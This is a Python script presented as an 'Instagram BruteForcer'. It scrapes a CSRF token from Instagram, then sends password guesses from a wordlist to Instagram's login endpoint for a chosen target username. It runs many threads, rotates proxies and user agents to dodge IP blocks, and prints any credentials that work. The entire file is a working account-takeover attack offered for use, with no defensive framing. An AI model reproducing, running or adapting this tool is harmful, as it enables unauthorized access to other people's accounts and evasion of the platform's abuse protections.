# coding=utf-8
# !/usr/bin/python

from __future__ import print_function
import argparse
import logging
import random
import socket
import sys
import threading

r="\033[31;1m"
w="\033[00m"
c ="\033[34;1m"
y="\033[33;1m"
g="\033[32;1m"
try:
    import urllib.request as rq
    from urllib.error import HTTPError
    import urllib.parse as http_parser
except ImportError:
    import urllib2 as rq
    from urllib2 import HTTPError
    import urllib as http_parser

try:
    import Queue
except ImportError:
    import queue as Queue

def check_proxy(q):
    """
    check proxy for and append to working proxies
    :param q:
    """
    if not q.empty():

        proxy = q.get(False)
        proxy = proxy.replace("\r", "").replace("\n", "")

        try:
            opener = rq.build_opener(
                rq.ProxyHandler({'https': 'https://' + proxy}),
                rq.HTTPHandler(),
                rq.HTTPSHandler()
            )

            opener.addheaders = [('User-agent', 'Mozilla/5.0')]
            rq.install_opener(opener)

            req = rq.Request('https://api.ipify.org/')

            if rq.urlopen(req).read().decode() == proxy.partition(':')[0]:
                proxys_working_list.update({proxy: proxy})
                if _verbose:
                    print(c+"[+]"+w+" Successfully connected with "+proxy)
            else:
                if _verbose:
                    print(r+"[!]"+w+" Failed to connect with "+proxy)

        except Exception as err:
            if _verbose:
                print(r+"[!]"+w+" Failed to connect with "+proxy)
            if _debug:
                logger.error(err)
            pass


def get_csrf():
    """
    get CSRF token from login page to use in POST requests
    """
    global csrf_token

    print(y+"[+]"+w+" Trying to get CSRF token ...")

    try:
        opener = rq.build_opener(rq.HTTPHandler(), rq.HTTPSHandler())
        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
        rq.install_opener(opener)

        request = rq.Request('https://www.instagram.com/')
        try:
            # python 2
            headers = rq.urlopen(request).info().headers
        except Exception:
            # python 3
            headers = rq.urlopen(request).info().get_all('Set-Cookie')

        for header in headers:
            if header.find('csrftoken') != -1:
                csrf_token = header.partition(';')[0].partition('=')[2]
                print(c+"[+]"+w+" CSRF Token : "+csrf_token)
    except Exception as err:
        print(r+"[!]"+w+" Oops, cant get CSRF token, please try again")

        if _debug:
            logger.error(err)

        print("[!]"" Exiting ...")
        exit(3)


def brute(q):
    """
    main worker function
    :param word:
    :param event:
    :return:
    """
    if not q.empty():
        try:
            proxy = None
            if len(proxys_working_list) != 0:
                proxy = random.choice(list(proxys_working_list.keys()))

            word = q.get()
            word = word.replace("\r", "").replace("\n", "")

            post_data = {
                'username': USER,
                'password': word,
            }

            header = {
                "User-Agent": random.choice(user_agents),
                'X-Instagram-AJAX': '1',
                "X-CSRFToken": csrf_token,
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                'Cookie': 'csrftoken=' + csrf_token
            }

            if proxy:
                if _verbose:
                    print(y+"[+]"+w+" Password incorrect %s %s " % (word, proxy,))

                opener = rq.build_opener(
                    rq.ProxyHandler({'https': 'https://' + proxy}),
                    rq.HTTPHandler(),
                    rq.HTTPSHandler()
                )

            else:
                if _verbose:
                    print(y+"[+]"+w+" Password incorrect %s" % (word,))

                opener = rq.build_opener(
                    rq.HTTPHandler(),
                    rq.HTTPSHandler()
                )

            rq.install_opener(opener)

            req = rq.Request(URL, data=http_parser.urlencode(post_data).encode('ascii'), headers=header)
            sock = rq.urlopen(req)

            if sock.read().decode().find('"authenticated": true') != -1:
                print(c+"\n[+]"+w+" Successfully login")
                print(w+"    Username: "+y, USER)
                print(w+"    Password: "+y, word)
                found_flag = True
                q.queue.clear()
                q.task_done()

        except HTTPError as e:
            if e.getcode() == 400 or e.getcode() == 403:
                if e.read().decode("utf8", 'ignore').find('"checkpoint_required"') != -1:
                    print(c+"\n[!]"+w+" Successfully login, but checkpoint")
                    print("")
                    print(r+"[!]"+w+" Username: "+y, USER)
                    print(r+"[!]"+w+" Password: "+y, word)
                    print("")
                    found_flag = True
                    q.queue.clear()
                    q.task_done()
                    return
                elif proxy:
                    print(r+"[!] Error:"+w+" Proxy IP %s now is blocked by instagram" % (proxy,))
                    if proxy in proxys_working_list:
                        proxys_working_list.pop(proxy)
                    print(c+"[+]"+w+" Online Proxy: ", str(len(proxys_working_list)))
                else:
                    print(r+"[!ERROR]"+w+" Your IP now is blocked by instagram")
                    print(r+"[!ERROR]"+w+" Please use Proxy or VPN")
            else:
                print(r+"[!]"+w+" Error:", e.getcode())

            q.task_done()
            return

        except Exception as err:
            if _debug:
                print(r+"[!]"+w+" Problems in the proxy connection")
                logger.error(err)
            else:
                print(r+"[!]"+w+" Problems in the proxy connection")

            pass
            return


def starter():
    """
    threading workers initialize
    """
    global found_flag

    queue = Queue.Queue()
    threads = []
    max_thread = THREAD
    found_flag = False

    queuelock = threading.Lock()

    print(y+"\n[+]"+w+" Preparing for attack ...")
    print(c+"[!]"+w+" Bruteforce is running\n")

    try:
        for word in words:
            queue.put(word)
        while not queue.empty():
            queuelock.acquire()
            for workers in range(max_thread):
                t = threading.Thread(target=brute, args=(queue,))
                t.setDaemon(True)
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
            queuelock.release()
            if found_flag:
                break
        print("")
        print(c+"[!]"+w+" Bruteforce attack completed")
        
    except Exception as err:
        print(err)
    except KeyboardInterrupt:
            sys.exit(1)


def check_avalaible_proxys(proxys):
    """
        check avalaible proxyies from proxy_list file
    """
    socket.setdefaulttimeout(30)

    global proxys_working_list
    print(y+"[+]"+w+" Try connecting with a proxy list ...\n")

    proxys_working_list = {}
    max_thread = THREAD

    queue = Queue.Queue()
    queuelock = threading.Lock()
    threads = []

    for proxy in proxys:
        queue.put(proxy)

    while not queue.empty():
        queuelock.acquire()
        for workers in range(max_thread):
            t = threading.Thread(target=check_proxy, args=(queue,))
            t.setDaemon(True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        queuelock.release()

    print(c+"[+]"+w+" Successfully connected with "+ str(len(proxys_working_list))+" proxy")


if __name__ == "__main__":

    parser = argparse.ArgumentParser(
        description="Instagram BruteForcer",
        epilog="./instabrute -u user_test -w words.txt -p proxys.txt -t 4 -d -v"
    )

    # required argument
    parser.add_argument('-u', '--username', action="store", required=True,
                        help='Target Username')
    parser.add_argument('-w', '--word', action="store", required=True,
                        help='Words list path')
    parser.add_argument('-p', '--proxy', action="store", required=True,
                        help='Proxy list path')
    # optional arguments
    parser.add_argument('-t', '--thread', help='Thread', type=int, default=4)
    parser.add_argument('-v', '--verbose', action='store_const', help='Thread', const=True, default=False)
    parser.add_argument('-d', '--debug', action='store_const', const=True, help='Debug mode', default=False)

    args = parser.parse_args()

    URL = "https://www.instagram.com/accounts/login/ajax/"
    USER = args.username
    THREAD = args.thread
    _verbose = args.verbose
    _debug = args.debug

    user_agents = ["Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
                   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko)",
                   "Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1",
                   "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)",
                   "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201",
                   "Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0",
                   "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))"]

    try:
        words = open(args.word).readlines()
    except IOError:
        print(r+"[+]"+w+" Error: Check your word list file path")
        sys.exit(1)

    try:
        proxys = open(args.proxy).readlines()
    except IOError:
        print(r+"[+]"+w+" Error: Check your proxy list file path")
        sys.exit(1)

    # enable debugging if its set
    if _debug:
        # Logging stuff
        logging.basicConfig(level=logging.DEBUG, filename="log",
                            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        logger = logging.getLogger(__name__)

    print(c+"[+]"+w+" Starting bruteforce attack to", USER)
    print(c+"[+]"+w+" List of words found on file", str(len(words)))
    print(c+"[+]"+w+" List of proxy found on proxys.txt", str(len(proxys)))

    check_avalaible_proxys(proxys)
    get_csrf()
    starter()